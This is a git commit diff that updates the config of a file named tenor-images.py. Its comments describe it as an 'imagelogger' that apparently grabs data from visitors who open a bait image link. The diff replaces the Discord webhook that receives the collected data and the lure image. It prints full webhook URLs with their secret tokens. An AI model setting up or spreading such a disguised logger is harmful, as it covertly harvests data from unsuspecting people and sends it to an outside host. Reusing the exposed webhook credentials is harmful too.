f1ee89b4b6cd357cd5fb87f3909c89c7a1629063
theskidboi259 <skylabsceoofsky.og@gmail.com>
2025-07-03 15:42:01 -0600

    Update tenor-images.py

--- api/tenor-images.py
+++ api/tenor-images.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1390446023700254944/jv1FY--zqYBExeesQWdvrQWJ6_YAbeMzAcyhzEqhseQY40A8duLsnuPXPKaHrngAXfhm",
+    "image": "https://yt3.googleusercontent.com/dasQmdeg0QuYPJ8B-OFzFgctO3Yv0ZIVaaOmrhYI4rj4LjKWefPfLhEfCpSvpGGql0il8txxhQ=s900-c-k-c0x00ffffff-no-rj", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
